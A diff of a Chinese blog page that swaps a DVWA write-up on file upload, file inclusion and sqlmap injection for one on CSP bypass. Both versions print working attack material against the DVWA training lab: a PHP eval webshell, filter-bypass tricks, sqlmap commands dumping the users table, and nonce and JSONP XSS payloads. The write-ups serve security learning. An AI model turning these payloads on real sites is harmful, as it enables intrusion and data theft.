@@ -4,17 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件上传 DVWA, 是小竹不是小猪">
-    <meta name="description" content="文件上传Low源码分析:没有过分限制于提交文件的格式编写一句话木马并且进行提交
-文本内容是
-&amp;lt;?php
-@eval($_POST[&amp;#39;hack&amp;#39;])
-?&amp;gt;
-
-
-在图中目录中查看已经提交的hack.php文件
-
-打开">
+    <meta name="keywords" content="DVWA  CSF Bypass, 是小竹不是小猪">
+    <meta name="description" content="Low右击点击检查 ，查看网络选项，里面的
+Content-Security-Policy: script-src ‘self’ https://pastebin.com hastebin.com example.com code.jque">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件上传 DVWA | 是小竹不是小猪</title>
+    <title>DVWA  CSF Bypass | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -318,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件上传 DVWA</h1>
+                    <h1 class="description center-align post-title">DVWA  CSF Bypass</h1>
                 </div>
             </div>
         </div>
@@ -451,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-07
+                    2022-03-14
                 </div>
                 
 
@@ -472,71 +464,121 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="源码分析-没有过分限制于提交文件的格式"><a href="#源码分析-没有过分限制于提交文件的格式" class="headerlink" title="源码分析:没有过分限制于提交文件的格式"></a>源码分析:没有过分限制于提交文件的格式</h3><h2 id><a href="#" class="headerlink" title></a><img src="/2022/03/07/0307/1.PNG" alt="1"></h2><p>编写一句话木马并且进行提交</p>
-<p>文本内容是</p>
+                <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>右击点击检查 ，查看网络选项，里面的</p>
+<p>Content-Security-Policy: script-src ‘self’ <a target="_blank" rel="noopener" href="https://pastebin.com/">https://pastebin.com</a> hastebin.com example.com code.jquery.com <a target="_blank" rel="noopener" href="https://ssl.google-analytics.com/">https://ssl.google-analytics.com</a> ;</p>
+<p>点击进入 <a target="_blank" rel="noopener" href="https://pastebin.com网站/">https://pastebin.com网站</a></p>
+<p>在paste 中输入alert(“hahaha”)</p>
+<p><img src="/2022/03/14/0314/3.PNG" alt="3"></p>
+<p>不用修改设置，直接点击创建连接</p>
+<p><img src="/2022/03/14/0314/2.PNG" alt="2"></p>
+<p>点击row尝试访问</p>
+<p><img src="/2022/03/14/0314/4.PNG" alt="4"></p>
+<p>赋值网址</p>
+<p><img src="/2022/03/14/0314/5.PNG" alt="5"></p>
+<p>进行注入，发现出现弹窗即可，但是由于网址是国外的，访问慢，会出不来弹窗。</p>
+<p><img src="/2022/03/14/0314/6.PNG" alt="6"></p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>查看服务器源代码</p>
 <pre><code class="php">&lt;?php
-@eval($_POST[&#39;hack&#39;])
+
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&quot;;
+
+header($headerCSP);
+
+// Disable XSS protections so that inline alert boxes will work
+header (&quot;X-XSS-Protection: 0&quot;);
+
+# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;
+
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[ &#39;body&#39; ] .= &quot;
+    &quot; . $_POST[&#39;include&#39;] . &quot;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;
+    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;
+&lt;/form&gt;
+&#39;;
+</code></pre>
+<p>发现,直接输入，发现出现弹窗</p>
+<pre><code class="js">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>接下来看看csp信息：</p>
+<pre><code class="php">$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&quot;;
+</code></pre>
+<p>当csp有Unsafe-inline时, 并且受限于csp无法直接引入外部js, 不过当frame-src<br>为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。</p>
+<p>nonce-source，仅允许特定的内联脚本块。如源码中：nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code class="php">&lt;?php
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39;;&quot;;
+
+header($headerCSP);
+
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[ &#39;body&#39; ] .= &quot;
+    &quot; . $_POST[&#39;include&#39;] . &quot;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;The page makes a call to &#39; . DVWA_WEB_PAGE_TO_ROOT . &#39;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;
+    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;
+    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;
+&lt;/form&gt;
+
+&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;
+&#39;;
+
+</code></pre>
+<p>没有输入框，查看源代码发现csp”Content-Security-Policy: script-src ‘self’;” 只能从本页面调用javascript脚本。观察源代码中的source/high.js。</p>
+<pre><code class="js">function clickButton() &#123;
+    var s = document.createElement(&quot;script&quot;);
+    s.src = &quot;source/jsonp.php?callback=solveSum&quot;;
+    document.body.appendChild(s);
+&#125;
+
+function solveSum(obj) &#123;
+    if (&quot;answer&quot; in obj) &#123;
+        document.getElementById(&quot;answer&quot;).innerHTML = obj[&#39;answer&#39;];
+    &#125;
+&#125;
+
+var solve_button = document.getElementById (&quot;solve&quot;);
+
+if (solve_button) &#123;
+    solve_button.addEventListener(&quot;click&quot;, function() &#123;
+        clickButton();
+    &#125;);
+&#125;
+</code></pre>
+<p>这个js代码的功能就是，当点击求和是跳转到题目所示的php页面，成一个 script 标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到 DOM 中 ，js中定义了一个 solveNum 的函数 -&gt; 因此 script 标签会把远程加载的 solveSum({“answer”:“15”}) 当作 js 代码执行, 而这个形式正好就是调用了 solveSum 函数, 然后这个函数就会在界面适当的位置写入答案。</p>
+<p>查看jsonp.js代码</p>
+<pre><code class="js">&lt;?php
+header(&quot;Content-Type: application/json; charset=UTF-8&quot;);
+
+if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;
+    $callback = $_GET[&#39;callback&#39;];
+&#125; else &#123;
+    return &quot;&quot;;
+&#125;
+
+$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);
+
+echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;
 ?&gt;
 </code></pre>
-<p><img src="/2022/03/07/0307/2.PNG" alt="2"></p>
-<p>在图中目录中查看已经提交的hack.php文件</p>
-<p><img src="/2022/03/07/0307/3.PNG" alt="3"></p>
-<p>打开蚁剑进行链接，右击新建，添加相关信息。</p>
-<p><img src="/2022/03/07/0307/4.PNG" alt="4"></p>
-<p><img src="/2022/03/07/0307/5.PNG" alt="5"></p>
-<p>右击新添加的url地址，打开文件管理。</p>
-<p><img src="/2022/03/07/0307/6.PNG" alt="6"></p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码分析：对文件上传格式有限制"><a href="#源码分析：对文件上传格式有限制" class="headerlink" title="源码分析：对文件上传格式有限制"></a>源码分析：对文件上传格式有限制</h3><p><img src="/2022/03/07/0307/7.PNG" alt="7"></p>
-<p>利用burp进行抓包。</p>
-<p><img src="/2022/03/07/0307/8.PNG" alt="8"></p>
-<p>将文件类型修改为image/png,进行放包可以提交成功。</p>
-<p><img src="/2022/03/07/0307/9.PNG" alt="9"></p>
-<p><img src="/2022/03/07/0307/10.PNG" alt="10"></p>
-<p><img src="/2022/03/07/0307/11.PNG" alt="11"></p>
-<p>利用蚁剑进行连接。</p>
-<p><img src="/2022/03/07/0307/12.PNG" alt="12"></p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h3><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是“*.jpg”、“.jpeg” 、“*.png”之一。同时，getimagesize（）函数更是限制了上传文件的文件头必须为图像类型。<br>我们需要将上传文件的文件头伪装成图片，利用copy命令进行图片和木马进行合并。</p>
-<p>建议选择10kb左右文件，如果文件过大可以使用在线图片压缩工具。</p>
-<p><img src="/2022/03/07/0307/13.PNG" alt="13"></p>
-<p>进行提交成功。</p>
-<p><img src="/2022/03/07/0307/14.PNG" alt="14"></p>
-<h1 id="file-inclusion-文件包含"><a href="#file-inclusion-文件包含" class="headerlink" title="file-inclusion (文件包含)"></a>file-inclusion (文件包含)</h1><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
-<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
-<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行。</p>
-<p>如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
-<p>所以文件包含漏洞常常会导致任意文件读取与任意命令执行。现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
-<p>我们现在利用漏洞来构造url：<a target="_blank" rel="noopener" href="http://192.168.35.132/DVWA-master/vulnerabilities/fi/?page=%E2%80%9C%E7%94%B5%E8%84%91%E4%B8%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E2%80%9D">http://192.168.35.132/DVWA-master/vulnerabilities/fi/?page=“电脑上任意文件路径”</a></p>
-<p><img src="/2022/03/07/0307/15.PNG" alt="15"></p>
-<p><img src="/2022/03/07/0307/16.PNG" alt="16"></p>
-<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。这里只是过滤了远程包含，但没有过滤本地包含。</p>
-<p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。例如page=htt<a target="_blank" rel="noopener" href="http://p//%E6%97%B6%EF%BC%8Cstr_replace%E5%87%BD%E6%95%B0%E4%BC%9A%E5%B0%86http://%E5%88%A0%E9%99%A4%EF%BC%8C%E4%BA%8E%E6%98%AFpage=http://%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E3%80%82">http://p://时，str_replace函数会将http://删除，于是page=http://，成功执行远程命令。</a></p>
-<p>因为没有过滤本地包含所以还这样还是可以。。</p>
-<p><img src="/2022/03/07/0307/17.PNG" alt="17"></p>
-<p><img src="/2022/03/07/0307/18.PNG" alt="18"></p>
-<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。<br>High级别的代码规定只能包含file开头的文件，看似安全，我们依然可以利用file协议绕过防护策略。</p>
-<p><img src="/2022/03/07/0307/19.PNG" alt="19"></p>
-<h1 id="SQL注入（sqlmap注入）"><a href="#SQL注入（sqlmap注入）" class="headerlink" title="SQL注入（sqlmap注入）"></a>SQL注入（sqlmap注入）</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch
+<p>参数通过get方式获取，且没有做过滤， 这可能作为一个注入点, 我们构造<br>并把这个当做 include 参数传给界面就 注入成功!</p>
+<pre><code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;xss&#39;);&quot;&gt;&lt;/script&gt;
 </code></pre>
-<p>其中cookie获取</p>
-<p><img src="/2022/03/07/0307/21.PNG" alt="21"></p>
-<p>利用sqlmap获取服务器信息</p>
-<p><img src="/2022/03/07/0307/22.PNG" alt="22"></p>
-<p>获取数据库名称</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch --dbs
-</code></pre>
-<p><img src="/2022/03/07/0307/23.PNG" alt="23"></p>
-<p>获取表</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch -D dvwa --tables
-</code></pre>
-<p><img src="/2022/03/07/0307/24.PNG" alt="24"></p>
-<p>获取列</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch -D dvwa -T users --columns
-</code></pre>
-<p><img src="/2022/03/07/0307/25.PNG" alt="25"></p>
-<p>爆破数据</p>
-<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch -D dvwa -T users --dump
-</code></pre>
-<p><img src="/2022/03/07/0307/26.PNG" alt="26"></p>
+<p><img src="/2022/03/14/0314/9.PNG" alt="9"></p>
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42075643/article/details/113928878">https://blog.csdn.net/weixin_42075643/article/details/113928878</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107827088">(30条消息) DVWA-CSP Bypass详解_Mr_helloword的博客-CSDN博客</a></p>
 
                 
             </div>
@@ -563,7 +605,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/07/0307/">http://example.com/2022/03/07/0307/</a>
+                    <a href="http://example.com/2022/03/14/0314/">http://example.com/2022/03/14/0314/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -770,54 +812,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/07/0308/">
+                <a href="/2022/03/14/0314/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="DVWA-SQL注入 medium high">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="DVWA  CSF Bypass">
                         
-                        <span class="card-title">DVWA-SQL注入 medium high</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-07
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            小竹
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/03/01/0301/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sqli-lab less11-12">
-                        
-                        <span class="card-title">sqli-lab less11-12</span>
+                        <span class="card-title">DVWA  CSF Bypass</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -828,7 +834,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小竹
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/13/0313/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="DVWA xss （stored)">
+                        
+                        <span class="card-title">DVWA xss （stored)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
                             </span>
                         <span class="publish-author">
                             
